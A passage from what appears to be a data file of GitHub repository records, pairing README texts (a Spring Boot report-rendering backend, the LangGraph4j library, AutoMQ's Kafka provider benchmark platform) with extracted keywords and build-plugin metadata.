```",0,0,1,mit,0.0,"['native', 'spring', 'ai', 'travel', 'recommendation', 'service', 'built', 'spring', 'ai', 'opeai', 'graalvm', 'base', 'regular', 'spring', 'app', 'integration', 'openai', 'implemented', 'note', 'app', 'using', 'build', 'native', 'app', 'graalvm', 'start', 'app', 'navigate', 'travel', 'request', 'form', 'submitting', 'preference', 'get', 'generated', 'recommendation', 'example']","['app', 'spring', 'native', 'ai', 'travel']",1,0,0,"['native', 'spring', 'ai', 'build', 'native', 'app', 'graalvm', 'start', 'app', 'navigate', 'travel', 'request', 'form']",3,"['native', 'app', 'spring', 'ai', 'build']",3,0.0,1.0,"[org.graalvm.buildtools:native-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,1.0,0.0,1225,23.125,5.205405405405405,[],0
52jing/wang-template-backend,master,"<h4 align=""right""><strong>English</strong> | <a href=""./README_zh.md"">简体中文</a></h4>

<p align=""center"">
   <img src=""https://img.shields.io/badge/license-Apache-blue.svg"" alt=""license"">
   <img src=""https://img.shields.io/badge/JDK-8+-green.svg"" alt=""jdk"">
   <img src=""https://img.shields.io/badge/Spring%20Boot-2.7-blue.svg"" alt=""springboot"">
</p> 

# Wang-Template: A Template Based Report Render Platform

## Introduction

This system is a report rendering module extracted from the actual production platform, as a stand-alone report generation system.

This system is BS architecture, this project is a backend service: 

- Github: [https://github.com/52jing/wang-template-backend](https://github.com/52jing/wang-template-backend)
- Gitee: [https://gitee.com/i52jing/wang-template-backend](https://gitee.com/i52jing/wang-template-backend)

Frontend service at:

- Github: [https://github.com/52jing/wang-template-admin](https://github.com/52jing/wang-template-admin)
- Gitee: [https://gitee.com/i52jing/wang-template-admin](https://gitee.com/i52jing/wang-template-admin)

## Features

1. Lightweight

```
This system only focuses on report generation, which can interface with any data source and generate corresponding reports through customized templates.
```

2. Extensible

```
The system adopts a modular architecture and an interface-oriented design, which makes it easy to quickly extend other data sources and rendering methods.
```

3. Easy Integration

```
Easily integrated into other systems as a module for report generation functions.
```

4. More Intelligent

```
Integration of AIGC services provides smarter report generation capabilities.
```

## Core Tech Stack

| Tech        | Version |
|-------------|---------|
| Java        | 8+      |
| Spring      | 5.3.31  |
| Spring Boot | 2.7.18  |

### Supported data source types

- Relational database SQL: supports querying data from relational databases, and data querying is realized through JDBC interface. Among them, MySQL, Postgresql and H2 have been verified and tested.

### Supported report types

- Word Report: Use [poi-tl](https://deepoove.com/poi-tl/) to support Word templates to generate Word reports.
- Text Report: Use [FreeMarker](https://freemarker.apache.org/) to support arbitrary text reports, generating text reports, such as TXT, Markdown, HTML and so on.

## Structures

```
WangTemplateBackend
|-- app  -- Report rendering module
|-- design  -- Database design files
|-- framework  -- Framework module
|-- report  -- Unit tests aggregation report
|-- system  -- System management module
|-- task  -- Task management module
```

## Deployment

### Quick Start

Use docker compose to quickly deploy:

- Github: [https://github.com/52jing/wang-template-compose](https://github.com/52jing/wang-template-compose)
- Gitee: [https://gitee.com/i52jing/wang-template-compose](https://gitee.com/i52jing/wang-template-compose)

### Deploy Backend

#### Docker

Build Image

```
docker build -t wang-template-backend:1.0 .
```

Mount config file and start container

```
docker run -d --name wang-template-backend -p 8000:8000 -v <path-to-config>/application-prod.yml:/opt/config/application-prod.yml wang-template-backend:1.0
```

#### Manually

Package by Maven

```
mvn clean package -DskipTests
```

Jar file is under app/target/app.jar, add config file and start jar.

### Deploy Frontend

#### Docker

Build Image

```
docker build -t wang-template-admin:1.0 .
```

Start Container

```
docker run -d --name wang-template-admin -p 8001:80 wang-template-admin:1.0
```

#### Manually

Build by Vite

```
yarn build
```

Files are under dist/spa directory.

Note: Since the frontend defaults to the same domain and port for backend services, you need to use a front load-balancing proxy, or configure the backend request base path when build the frontend (see Environment Variables).

## Snapshots

### Configure Datasource

![configure datasource](./images/1.png)

### Configure Datasource Parameters

![configure datasource parameters](./images/2.png)

### Datasource Detail

![datasource detail](./images/3.png)

### Test to retrieve data

![test to retrieve data](./images/4.png)

### Configure Template

![configure template](./images/5.png)

The template file is shown below

![template file](./images/template.png)

### Create generation task (select data source, template, enter parameters)

![create task](./images/6.png)

### View Results

![view results](./images/7.png)

The report generated is shown below

![generated report](./images/report.png)

## Configuration File Description

### Configuration File

Add configuration file `application-prod.yml` or `application-prod.properties`, can refer to `app/src/main/resources/example-application-dev.yml`.

### Configure Database

Configure under `spring.datasource.druid` or `mybatis-flex.datasource.master`.

Example:

```yaml
spring:
  flyway:
    # Enable flyway to migrate
    enabled: true
    # Note to change to the corresponding database directory
    # If there is no corresponding database, you can use PDManer to generate a database with design files.
    locations:
      - classpath:db/migration/mysql

mybatis-flex:
  # configure datasource
  datasource:
    # master datasource
    master:
      url: jdbc:mysql://localhost:3306/wb-template-dev?useUnicode=true&characterEncoding=utf8&zeroDateTimeBehavior=convertToNull&useSSL=true&serverTimezone=GMT%2B8
      username: root
      password: 123456
      # The following Druid parameters can be configured according to actual requirements
      # Initial connection pool size
      initial-size: 5
      # max active connection pool size
      max-active: 20
      # min connection pool size
      min-idle: 5
```

Supported databases for service (the following databases have been tested):

- MySQL 8
- MySQL 5 (Since Flyway doesn't support it, it needs to be executed manually for migration in `db.migration/mysql` and disable flyway)
- Postgresql
- H2

### Configure Attachment Storage

It depends on [x-file-storage](https://x-file-storage.xuyanwu.cn/#/), support local files, MinIO and cloud service storage, please refer to the official documentation.

Example

```yaml
dromara:
  x-file-storage: # Storage configuration
    default-platform: local-plus-1 # default platform
    thumbnail-suffix: "".min.jpg"" # thumbnail
    # storage platform configuration
    local-plus:
      - platform: local-plus-1 # name
        enable-storage: true  # enabled
        enable-access: true # enable access
        domain: http://127.0.0.1:8080/file/ # domain
        base-path: local-plus/ # base path
        path-patterns: /file/** # access path
        storage-path: ./data # storage directory
```

### Configure Report Analysis (AI)

```yaml
analysis:
  # enable indicator analysis
  indicatorAnalysis: true
  # use kimi cloud service, please use  Kimi API access key, refer to https://platform.moonshot.cn/docs/intro#%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97
  moonShot:
    accessToken:
```

## Template Introduction

### Template Context Data

All templates are injected with a rendered context object, which has the following format:
```json5
{
  ""templateName"": """",  // template name
  ""datasourceName"": """",  // datasource name
  ""params"": {},  // render parameters
  ""envs"": {  // environments
    ""year"": 2024,  // year
    ""month"": 6,  // month
    ""day"": 12,  // day
    ""dayOfWeek"": 3,  // day of week
    ""hour"": 0,  // hour
    ""minute"": 0,  // minute
    ""second"": 0  // second
  },
  ""data"": {}  // data obtained from a data source, which may be an array or an object
}
```

To use it in the template like this: `${envs.year}`。

### Word Template

Word template depends on [poi-tl](https://deepoove.com/poi-tl/) , the syntax can be found in the official documentation. The variables use `${name}` style。

### Text Template

Text template depends on [FreeMarker](https://freemarker.apache.org/) , the syntax tan be found in the official documentation.

## Follow-up Plan

- Support for more data sources
- Adding timed tasks and generating schedules
- Integrate more AI capabilities
",0,0,1,apache-2.0,0.0,"['template', 'based', 'report', 'render', 'platform', 'introduction', 'system', 'report', 'rendering', 'module', 'extracted', 'actual', 'production', 'platform', 'report', 'generation', 'system', 'system', 'b', 'architecture', 'project', 'backend', 'service', 'github', 'http', 'gitee', 'http', 'frontend', 'service', 'github', 'http', 'gitee', 'http', 'feature', 'lightweight', 'extensible', 'easy', 'integration', 'intelligent', 'core', 'tech', 'stack', 'tech', 'version', 'java', 'spring', 'spring', 'boot', 'supported', 'data', 'source', 'type', 'relational', 'database', 'sql', 'support', 'querying', 'data', 'relational', 'database', 'data', 'querying', 'realized', 'jdbc', 'interface', 'among', 'mysql', 'postgresql', 'verified', 'tested', 'supported', 'report', 'type', 'word', 'report', 'use', 'support', 'word', 'template', 'generate', 'word', 'report', 'text', 'report', 'use', 'freemarker', 'support', 'arbitrary', 'text', 'report', 'generating', 'text', 'report', 'txt', 'markdown', 'html', 'structure', 'deployment', 'quick', 'start', 'use', 'docker', 'compose', 'quickly', 'deploy', 'github', 'http', 'gitee', 'http', 'deploy', 'backend', 'docker', 'build', 'image', 'mount', 'config', 'file', 'start', 'container', 'manually', 'package', 'maven', 'jar', 'file', 'add', 'config', 'file', 'start', 'jar', 'deploy', 'frontend', 'docker', 'build', 'image', 'start', 'container', 'manually', 'build', 'vite', 'file', 'directory', 'note', 'since', 'frontend', 'default', 'domain', 'port', 'backend', 'service', 'need', 'use', 'front', 'proxy', 'configure', 'backend', 'request', 'base', 'path', 'build', 'frontend', 'see', 'environment', 'variables', 'snapshot', 'configure', 'datasource', 'configure', 'datasource', 'parameter', 'datasource', 'detail', 'test', 'retrieve', 'data', 'configure', 'template', 'template', 'file', 'shown', 'create', 'generation', 'task', 'select', 'data', 'source', 'template', 'enter', 'parameter', 'view', 'results', 'report', 'generated', 'shown', 'configuration', 'file', 'description', 'configuration', 'file', 'add', 'configuration', 'file', 'refer', 'configure', 'database', 'configure', 'example', 'supported', 'database', 'service', 'following', 'database', 'tested', 'mysql', 'mysql', 'since', 'flyway', 'support', 'need', 'executed', 'manually', 'migration', 'disable', 'flyway', 'postgresql', 'configure', 'attachment', 'storage', 'depends', 'support', 'local', 'file', 'minio', 'cloud', 'service', 'storage', 'please', 'refer', 'official', 'documentation', 'example', 'configure', 'report', 'analysis', 'ai', 'template', 'introduction', 'template', 'context', 'data', 'template', 'injected', 'rendered', 'context', 'object', 'following', 'format', 'use', 'template', 'like', 'word', 'template', 'word', 'template', 'depends', 'syntax', 'found', 'official', 'documentation', 'variable', 'use', 'text', 'template', 'text', 'template', 'depends', 'freemarker', 'syntax', 'tan', 'found', 'official', 'documentation', 'plan', 'support', 'data', 'source', 'adding', 'timed', 'task', 'generating', 'schedule', 'integrate', 'ai', 'capability']","['template', 'report', 'file', 'configure', 'data']",3,0,0,"['a', 'template', 'base', 'report', 'render', 'platform', 'introduction', 'feature', 'core', 'tech', 'stack', 'support', 'data', 'source', 'type', 'support', 'report', 'type', 'structure', 'deployment', 'quick', 'start', 'deploy', 'backend', 'docker', 'manually', 'deploy', 'frontend', 'docker', 'manually', 'snapshot', 'configure', 'datasource', 'configure', 'datasource', 'parameter', 'datasource', 'detail', 'test', 'retrieve', 'data', 'configure', 'template', 'create', 'generation', 'task', 'select', 'data', 'source', 'template', 'enter', 'parameter', 'view', 'result', 'configuration', 'file', 'description', 'configuration', 'file', 'configure', 'database', 'enable', 'flyway', 'migrate', 'note', 'change', 'correspond', 'database', 'directory', 'if', 'corresponding', 'database', 'use', 'pdmaner', 'generate', 'database', 'design', 'file', 'configure', 'datasource', 'master', 'datasource', 'the', 'following', 'druid', 'parameter', 'configure', 'accord', 'actual', 'requirement', 'initial', 'connection', 'pool', 'size', 'max', 'active', 'connection', 'pool', 'size', 'min', 'connection', 'pool', 'size', 'configure', 'attachment', 'storage', 'storage', 'configuration', 'default', 'platform', 'thumbnail', 'storage', 'platform', 'configuration', 'name', 'enable', 'enable', 'access', 'domain', 'base', 'path', 'access', 'path', 'storage', 'directory', 'configure', 'report', 'analysis', 'ai', 'enable', 'indicator', 'analysis', 'use', 'kimi', 'cloud', 'service', 'please', 'use', 'kimi', 'api', 'access', 'key', 'refer', 'http', 'bd', 'bf', 'template', 'introduction', 'template', 'context', 'data', 'word', 'template', 'text', 'template', 'plan']",55,"['configure', 'template', 'datasource', 'data', 'configuration']",15,38.0,6.0,"[com.diffplug.spotless:spotless-maven-plugin,maven-compiler-plugin,org.apache.maven.plugins:maven-resources-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.codehaus.mojo:flatten-maven-plugin,org.jacoco:jacoco-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,4.0,2.0,8107,31.97058823529412,5.318307267709292,"['https://github.com/52jing/wang-template-backend -> https://github.com/52jing/wang-template-backend', 'https://gitee.com/i52jing/wang-template-backend -> https://gitee.com/i52jing/wang-template-backend', 'https://github.com/52jing/wang-template-admin -> https://github.com/52jing/wang-template-admin', 'https://gitee.com/i52jing/wang-template-admin -> https://gitee.com/i52jing/wang-template-admin', 'poi-tl -> https://deepoove.com/poi-tl/', 'FreeMarker -> https://freemarker.apache.org/', 'https://github.com/52jing/wang-template-compose -> https://github.com/52jing/wang-template-compose', 'https://gitee.com/i52jing/wang-template-compose -> https://gitee.com/i52jing/wang-template-compose', 'x-file-storage -> https://x-file-storage.xuyanwu.cn/#/', 'poi-tl -> https://deepoove.com/poi-tl/', 'FreeMarker -> https://freemarker.apache.org/']",11
bsorrentino/langgraph4j,main,"
# 🦜🕸️ LangGraph for Java

[![Javadoc](https://img.shields.io/badge/Javadoc-Documentation-blue)][javadocs] [![Static Badge](https://img.shields.io/badge/maven--snapshots-1.0--SNAPSHOT-blue)][snapshots] [![Maven Central](https://img.shields.io/maven-central/v/org.bsc.langgraph4j/langgraph4j-core-jdk8.svg)][releases]

LangGraph for Java. A library for building stateful, multi-agents applications with LLMs, built for work with [langchain4j]
> It is a porting of original [LangGraph] from [LangChain AI project][langchain.ai] in Java fashion

## Features

- [x] StateGraph
- [x] Nodes
- [x] Edges
- [x] Conditional Edges
- [x] Entry Points
- [x] Conditional Entry Points
- [x] State
  - [x] Schema (_a series of Channels_)
    - [x] Reducer (_how apply  updates to the state attributes_)
    - [x] Default provider
    - [x] AppenderChannel (_values accumulator_)
- [x] Compiling graph    
- [x] Async support (_throught [CompletableFuture]_)
- [x] Streaming support (_throught [java-async-generator]_)
- [x] Checkpoints (_save and replay feature_)
- [x] Graph visualization
  - [x] [PlantUML]
  - [x] [Mermaid]
- [x] Playground (_Embeddable Webapp that plays with LangGraph4j_)
- [x] Threads (_checkpointing of multiple different runs_)
- [x] Update state (_interact with the state directly and update it_)
- [x] Breakpoints (_pause and resume feature_)
- [x] [Studio] (_Playground Webapp_)
- [ ] Parallel Node Execution
- [ ] Parallel Node Execution
- [ ] Child Graphs
- [ ] Streaming response from LLM results


## Samples

| Project         | Integrated With        
|--------------|----------------| 
[Agent Executor][springai-agentexecutor] |  [SpringAI]
[Agent Executor][agent-executor] |  [Langchain4j][langchain4j]
[Image To PlantUML Diagram][image-to-diagram]   | [Langchain4j][langchain4j]
[Adaptive RAG][adaptive-rag] | [Langchain4j][langchain4j]


## How To(s)

* [How to add persistence (""memory"") to your graph][howto-presistence]
* [How to view and update past graph state][howto-timetravel]

## Releases

| Date         | Release        | info
|--------------|----------------| ---
| Oct 12, 2024 | `1.0-rc2` | official release candidate


## Quick Start 

### Adding LangGraph dependency 

#### Last stable version

**Maven**
```xml
<dependency>
    <groupId>org.bsc.langgraph4j</groupId>
    <artifactId>langgraph4j-core-jdk8</artifactId>
    <version>1.0-rc2</version>
</dependency>
```

#### Development Version 

**Maven**
```xml
<dependency>
    <groupId>org.bsc.langgraph4j</groupId>
    <artifactId>langgraph4j-core-jdk8</artifactId>
    <version>1.0-SNAPSHOT</version>
</dependency>
```

### Define the agent state

The main type of graph in `langgraph` is the `StatefulGraph`. This graph is parameterized by a state object that it passes around to each node. 
Each node then returns operations to update that state. These operations can either SET specific attributes on the state (e.g. overwrite the existing values) or ADD to the existing attribute. 
Whether to set or add is described in the state's schema provided to the graph. The schema is a Map of Channels, each Channel represent an attribute in the state. If an attribute is described with an `AppendeChannel` it will be a List and each element referring the attribute will be automaically added by graph during processing. The State must inherit from `AgentState` base class (that essentially is a `Map` wrapper).

```java
public class AgentState {

   public AgentState( Map<String,Object> initData ) { ... }
   
   public final java.util.Map<String,Object> data() { ... }

   public final <T> Optional<T> value(String key) { ... }
   public final <T> T value(String key, T defaultValue ) { ... }
   public final <T> T value(String key, Supplier<T>  defaultProvider ) { ... }
    

}
```

### Define the nodes

We now need to define a few different nodes in our graph. In `langgraph`, a node is an async/sync function that accept an `AgentState` as argument and returns a (partial) state update. There are two main nodes we need for this:

1. **The agent**: responsible for deciding what (if any) actions to take.
1. **A function to invoke tools**: if the agent decides to take an action, this node will then execute that action.

```java

/**
 * Represents an asynchronous node action that operates on an agent state and returns state update.
 *
 * @param <S> the type of the agent state
 */
@FunctionalInterface
public interface AsyncNodeAction<S extends AgentState> extends Function<S, CompletableFuture<Map<String, Object>>> {

    CompletableFuture<Map<String, Object>> apply(S t);

    /**
     * Creates an asynchronous node action from a synchronous node action.
     */
    static <S extends AgentState> AsyncNodeAction<S> node_async(NodeAction<S> syncAction) { ... }
}

```

### Define Edges

We will also need to define some edges. Some of these edges may be conditional. The reason they are conditional is that based on the output of a node, one of several paths may be taken. The path that is taken is not known until that node is run (the LLM decides).

1. **Conditional Edge**: after the agent is called, we should either:
    * If the agent said to take an action, then the function to invoke tools should be called
    * If the agent said that it was finished, then it should finish
1. **Normal Edge**: after the tools are invoked, it should always go back to the agent to decide what to do next

```java

/**
 * Represents an asynchronous edge action that operates on an agent state and returns a new route.
 *
 * @param <S> the type of the agent state
 */
public interface AsyncEdgeAction<S extends AgentState> extends Function<S, CompletableFuture<String>> {

    CompletableFuture<String> apply(S t);

    /**
     * Creates an asynchronous edge action from a synchronous edge action.
     */
    static <S extends AgentState> AsyncEdgeAction<S> edge_async(EdgeAction<S> syncAction ) { ... }
}
```

### Define the graph

We can now put it all together and define the graph! (see example below)

## Integrate with LangChain4j

Like default use case proposed in [LangGraph blog][langgraph.blog], We have ported [AgentExecutor] implementation from [langchain] using LangGraph4j. In the [agents](agents) project's module, you can the complete working code with tests. Feel free to checkout and use it as a reference.
Below you can find a piece of code of the `AgentExecutor` to give you an idea of how is has built in langgraph style.


```java

public static class State implements AgentState {

    // the state's (partial) schema 
    static Map<String, Channel<?>> SCHEMA = mapOf(
        ""intermediate_steps"", AppenderChannel.<IntermediateStep>of(ArrayList::new)
    );

    public State(Map<String, Object> initData) {
        super(initData);
    }

    Optional<String> input() {
        return value(""input"");
    }
    Optional<AgentOutcome> agentOutcome() {
        return value(""agent_outcome"");
    }
    List<IntermediateStep> intermediateSteps() {
        return this.<List<IntermediateStep>>value(""intermediate_steps"").orElseGet(emptyList());
    }
   
}

var toolInfoList = ToolInfo.fromList( objectsWithTools );

final List<ToolSpecification> toolSpecifications = toolInfoList.stream()
        .map(ToolInfo::specification)
        .toList();

var agentRunnable = Agent.builder()
                        .chatLanguageModel(chatLanguageModel)
                        .tools( toolSpecifications )
                        .build();

// Fluent Interface
var app = new StateGraph<>(State.SCHEMA,State::new)
                .addEdge(START,""agent"")
                .addNode( ""agent"", node_async( state ->
                    runAgent(agentRunnable, state))
                )
                .addNode( ""action"", node_async( state ->
                    executeTools(toolInfoList, state))
                )
                .addConditionalEdges(
                        ""agent"",
                        edge_async( state -> {
                            if (state.agentOutcome().map(AgentOutcome::finish).isPresent()) {
                                return ""end"";
                            }
                            return ""continue"";
                        }),
                        mapOf(""continue"", ""action"", ""end"", END)
                )
                .addEdge(""action"", ""agent"")
                .compile();

return  app.stream( inputs );

```

# References

* [LangGraph - LangChain Blog][langgraph.blog]
* [AI Agent in Java with LangGraph4j - Bartolomeo Blog][article01]
* [Java Async Generator, a Java version of Javascript async generator][java-async-generator]


[javadocs]: https://bsorrentino.github.io/langgraph4j/apidocs/index.html
[springai-agentexecutor]: samples/springai-agentexecutor
[agent-executor]: samples/agent-executor/
[adaptive-rag]: samples/image-to-diagram/
[image-to-diagram]: samples/adaptive-rag
[howto-presistence]: how-tos/persistence.ipynb
[howto-timetravel]: how-tos/time-travel.ipynb


[SpringAI]: https://spring.io/projects/spring-ai
[Studio]: https://bsorrentino.github.io/langgraph4j/studio/langgraph4j-studio/index.html
[CompletableFuture]: https://docs.oracle.com/javase/8/docs/api/java/util/concurrent/CompletableFuture.html
[article01]: https://bsorrentino.github.io/bsorrentino/ai/2024/05/20/langgraph-for-java.html
[langgraph.blog]: https://blog.langchain.dev/langgraph/
[langchain4j]: https://github.com/langchain4j/langchain4j
[langchain.ai]: https://github.com/langchain-ai
[langchain]: https://github.com/langchain-ai/langchain/
[langgraph]: https://github.com/langchain-ai/langgraph
[langchain.agents]: https://python.langchain.com/docs/modules/agents/
[AgentExecutor]: https://github.com/langchain-ai/langchain/blob/master/libs/langchain/langchain/agents/agent.py
[PlantUML]: https://plantuml.com
[java-async-generator]: https://github.com/bsorrentino/java-async-generator
[Mermaid]: https://mermaid.js.org

[snapshots]: https://oss.sonatype.org/content/repositories/snapshots/org/bsc/langgraph4j/langgraph4j-jdk8/1.0-SNAPSHOT
[releases]: https://central.sonatype.com/search?q=a%3Alanggraph4j-parent
",7,9,2,mit,3.0,"['langgraph', 'java', 'langgraph', 'java', 'library', 'building', 'stateful', 'application', 'llm', 'built', 'work', 'porting', 'original', 'langgraph', 'langchain', 'ai', 'project', 'java', 'fashion', 'feature', 'x', 'stategraph', 'x', 'node', 'x', 'edge', 'x', 'conditional', 'edge', 'x', 'entry', 'point', 'x', 'conditional', 'entry', 'point', 'x', 'state', 'x', 'schema', 'series', 'channel', 'x', 'reducer', 'apply', 'update', 'state', 'attribute', 'x', 'default', 'provider', 'x', 'appenderchannel', 'value', 'accumulator', 'x', 'compiling', 'graph', 'x', 'async', 'support', 'throught', 'completablefuture', 'x', 'streaming', 'support', 'throught', 'x', 'checkpoint', 'save', 'replay', 'feature', 'x', 'graph', 'visualization', 'x', 'plantuml', 'x', 'mermaid', 'x', 'playground', 'embeddable', 'webapp', 'play', 'x', 'thread', 'checkpointing', 'multiple', 'different', 'run', 'x', 'update', 'state', 'interact', 'state', 'directly', 'update', 'x', 'breakpoints', 'pause', 'resume', 'feature', 'x', 'studio', 'playground', 'webapp', 'parallel', 'node', 'execution', 'parallel', 'node', 'execution', 'child', 'graph', 'streaming', 'response', 'llm', 'result', 'sample', 'project', 'integrated', 'agent', 'executor', 'springai', 'agent', 'executor', 'image', 'plantuml', 'diagram', 'adaptive', 'rag', 'add', 'persistence', 'memory', 'graph', 'view', 'update', 'past', 'graph', 'state', 'releases', 'date', 'release', 'info', 'oct', 'official', 'release', 'candidate', 'quick', 'start', 'adding', 'langgraph', 'dependency', 'last', 'stable', 'version', 'maven', 'development', 'version', 'maven', 'define', 'agent', 'state', 'main', 'type', 'graph', 'graph', 'parameterized', 'state', 'object', 'pass', 'around', 'node', 'node', 'return', 'operation', 'update', 'state', 'operation', 'either', 'set', 'specific', 'attribute', 'state', 'overwrite', 'existing', 'value', 'add', 'existing', 'attribute', 'whether', 'set', 'add', 'described', 'state', 'schema', 'provided', 'graph', 'schema', 'map', 'channel', 'channel', 'represent', 'attribute', 'state', 'attribute', 'described', 'list', 'element', 'referring', 'attribute', 'automaically', 'added', 'graph', 'processing', 'state', 'must', 'inherit', 'base', 'class', 'essentially', 'wrapper', 'define', 'node', 'need', 'define', 'different', 'node', 'graph', 'node', 'function', 'accept', 'argument', 'return', 'partial', 'state', 'update', 'two', 'main', 'node', 'need', 'agent', 'responsible', 'deciding', 'action', 'take', 'function', 'invoke', 'tool', 'agent', 'decides', 'take', 'action', 'node', 'execute', 'action', 'define', 'edge', 'also', 'need', 'define', 'edge', 'edge', 'may', 'conditional', 'reason', 'conditional', 'based', 'output', 'node', 'one', 'several', 'path', 'may', 'taken', 'path', 'taken', 'known', 'node', 'run', 'llm', 'decides', 'conditional', 'edge', 'agent', 'called', 'either', 'agent', 'said', 'take', 'action', 'function', 'invoke', 'tool', 'called', 'agent', 'said', 'finished', 'finish', 'normal', 'edge', 'tool', 'invoked', 'always', 'go', 'back', 'agent', 'decide', 'next', 'define', 'graph', 'put', 'together', 'define', 'graph', 'see', 'example', 'integrate', 'like', 'default', 'use', 'case', 'proposed', 'langgraph', 'blog', 'ported', 'agentexecutor', 'implementation', 'langchain', 'using', 'agent', 'project', 'module', 'complete', 'working', 'code', 'test', 'feel', 'free', 'checkout', 'use', 'reference', 'find', 'piece', 'code', 'give', 'idea', 'built', 'langgraph', 'style', 'references', 'langgraph', 'langchain', 'blog', 'ai', 'agent', 'java', 'bartolomeo', 'blog', 'java', 'async', 'generator', 'java', 'version', 'javascript', 'async', 'generator']","['x', 'state', 'node', 'graph', 'agent']",1,5,0,"['langgraph', 'java', 'feature', 'sample', 'how', 'to', 's', 'release', 'quick', 'start', 'add', 'langgraph', 'dependency', 'last', 'stable', 'version', 'development', 'version', 'define', 'agent', 'state', 'define', 'node', 'define', 'edge', 'define', 'graph', 'integrate', 'reference']",15,"['define', 'langgraph', 'version', 'java', 'feature']",6,50.0,9.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-site-plugin,org.apache.maven.plugins:maven-surefire-plugin,org.apache.maven.plugins:maven-war-plugin,org.codehaus.mojo:exec-maven-plugin,org.projectlombok:lombok-maven-plugin,org.sonatype.plugins:nexus-staging-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,7.0,2.0,10078,35.77142857142857,5.550319488817891,"['![Javadoc -> https://img.shields.io/badge/Javadoc-Documentation-blue', 'javadocs] [![Static Badge -> https://img.shields.io/badge/maven--snapshots-1.0--SNAPSHOT-blue', 'snapshots] [![Maven Central -> https://img.shields.io/maven-central/v/org.bsc.langgraph4j/langgraph4j-core-jdk8.svg', 'langchain4j', 'LangGraph', 'LangChain AI project -> langchain.ai', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'x', 'CompletableFuture', 'x', 'x', 'x', 'x', 'PlantUML', 'x', 'Mermaid', 'x', 'x', 'x', 'x', 'x', ' ', ' ', ' ', ' ', 'Agent Executor -> springai-agentexecutor', 'SpringAI', 'Agent Executor -> agent-executor', 'Langchain4j -> langchain4j', 'Image To PlantUML Diagram -> image-to-diagram', 'Langchain4j -> langchain4j', 'Adaptive RAG -> adaptive-rag', 'Langchain4j -> langchain4j', 'How to view and update past graph state -> howto-timetravel', 'LangGraph blog -> langgraph.blog', 'AgentExecutor', 'langchain', 'javadocs', 'SpringAI', 'Studio', 'CompletableFuture', 'article01', 'langchain4j', 'langchain', 'langgraph', 'AgentExecutor', 'PlantUML', 'Mermaid', 'snapshots', 'releases']",61
AutoMQ/kafka-provider-comparison,main,"[English](README.md) | [简体中文](README_zh.md)
![](images/kpc_banner.png)

## Kafka Provider Comparison

Kafka Provider Comparison (KPC) is a public Kafka comparison platform built on the code of the [OpenMessaging Benchmark](https://github.com/openmessaging/benchmark).

The Kafka API has become the de facto standard in the streaming domain. In recent years, many new streaming systems compatible with the Kafka API (hereinafter referred to as Kafka Providers) have emerged. The purpose of building this comparison platform is not to determine the best Kafka streaming system, but to provide a **fair**, **objective**, and **open** comparison environment to generate objective and fair Kafka streaming system comparison reports. The comparison reports will include multiple comparison dimensions, such as latency, cost, elasticity, throughput, and more. Different products have different design architectures and trade-offs, and naturally, they will perform differently in various comparison dimensions. This objective comparison result will be very helpful for users in making technical selections.

## Supported Kafka Providers

* [AutoMQ](https://www.automq.com)
* [Apache Kafka](https://kafka.apache.org)
* [Amazon MSK](https://docs.amazonaws.cn/msk/index.html)

## Comparison Platform Execution Logic

All execution logic of the comparison platform is encapsulated in GitHub Actions, and comparison tasks are triggered through GitHub Actions Workflow. The execution logic of the comparison tasks is as follows:

1. GitHub Actions meet the scheduled trigger conditions and trigger the Workflow execution.
2. The Benchmark processes of multiple Kafka Providers included in the Workflow will be executed in parallel.
3. Each Benchmark Provider process includes the following sequential sub-stages, executed in order. Different Kafka Providers will be evaluated simultaneously.
   1. Install: Initialize cloud resources on AWS according to the Terraform configuration file, check out the code, install dependencies, and then use the Ansible playbook to install the Kafka Provider. This stage will also calculate the cost based on the Terraform configuration file, as part of the final Comparison Report.
   2. Benchmark: This stage depends on the Install stage and will be triggered after its completion. This stage mainly uses the information from the Terraform Output to remotely log in to the cloud Client machine and execute the OpenMessaging Benchmark test.
   3. Generate Report: The Benchmark result files executed on the cloud Client will be copied to the GitHub Runner machine, the content will be parsed to generate the final Report content, and displayed in [issue-1](https://github.com/AutoMQ/kafka-provider-comparison/issues/1)
   4. Uninstall: This stage depends on the Benchmark stage and will be triggered after its completion. This stage will clean up cloud resources, including deleting the cloud Client machine and the Kafka Provider cluster on the cloud.

## Benchmark Report Description

A complete Benchmark Report will include the following content:
- Report Generated: The generation time of the Report. Based on this generation time, you can see the specific Workflow execution details from the GitHub Actions of the open-source repository, including how the cost is calculated, the Benchmark output logs, etc.
- Workload Configuration: The Workload configuration information extracted from the OpenMessaging Benchmark run logs. To ensure the fairness of the comparison, we will use the exact same Workload, Producer, and Consumer configuration for all Kafka Providers.
- Producer Configuration: Producer configuration, the Producer configuration of all Kafka Providers is the same.
- Consumer Configuration: Consumer configuration, the Consumer configuration of all Kafka Providers is the same.
- Topic Configuration: Topic configuration, the Topic configuration of all Kafka Providers is the same.
- Replication Factor: Replication factor, the replication factor of all Kafka Providers is the same.
- Average Throughput: The average throughput during the entire Benchmark process, in MB/s.
- Pub Latency (ms) avg: The average publish latency during the entire Benchmark process, in ms.
- Pub Latency (ms) P99: The P99 publish latency during the entire Benchmark process, in ms.
- E2E LatencyAvg(ms): The average end-to-end latency during the entire Benchmark process, in ms.
- E2E P95 Latency(ms): The P95 end-to-end latency during the entire Benchmark process, in ms.
- E2E P99 Latency(ms): The P99 end-to-end latency during the entire Benchmark process, in ms.
- Baseline Cost: The baseline cost of the Kafka Provider (excluding the usage cost of IaaS cloud services), in USD. Based on [Infracost](https://www.infracost.io/), the cost is calculated by analyzing the Terraform configuration file.
- Usage Cost: The cloud resource usage cost of the Kafka Provider, in USD. Based on [Infracost](https://www.infracost.io/), the cost is calculated by analyzing the Terraform configuration file and usage configuration. The usage is calculated based on the infracost usage in the `infracost` directory. For example, for AutoMQ, we calculate the cost based on the average write throughput of 10MB/s, with 31.25 PUTs and 12.5 GETs per GB of write throughput. The cost estimation logic will be explained in detail in the following chapters.
